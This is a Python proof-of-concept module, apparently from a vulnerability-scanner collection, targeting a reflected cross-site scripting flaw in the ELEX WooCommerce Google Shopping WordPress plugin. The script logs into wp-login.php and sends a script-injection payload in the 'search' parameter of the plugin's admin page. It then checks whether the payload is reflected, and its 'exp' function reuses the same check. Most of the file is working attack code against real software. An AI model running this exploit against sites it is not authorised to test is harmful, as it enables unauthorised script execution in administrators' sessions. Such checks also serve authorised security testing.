import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''ELEX WooCommerce Google Shopping < 1.2.4 - Reflected Cross-Site Scripting (XSS)''',
        "description": '''The plugin does not sanitise or escape the search GET parameter before outputting back in the page, leading to a reflected Cross-Site Scripting issue, which will be executed in a logged in admin context.''',
        "severity": "medium",
        "references": [
            "https://wpscan.com/vulnerability/647448d6-32c0-4b38-a40a-3b54c55f4e2e"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["wordpress", "wp-plugin", "xss", "authenticated", "woocommerce"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        s = requests.Session()

        path = """/wp-login.php"""
        method = "POST"
        data = """log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': 'wordpress_test_cookie=WP%20Cookie%20check'}
        resp0 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/wp-admin/admin.php?page=elex-product-feed-manage&search=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"""
        method = "GET"
        data = """"""
        headers = {}
        resp1 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""</script><script>alert(document.domain)</script>""" in resp1.text) and ("""text/html""" in str(resp1.headers)) and (resp1.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url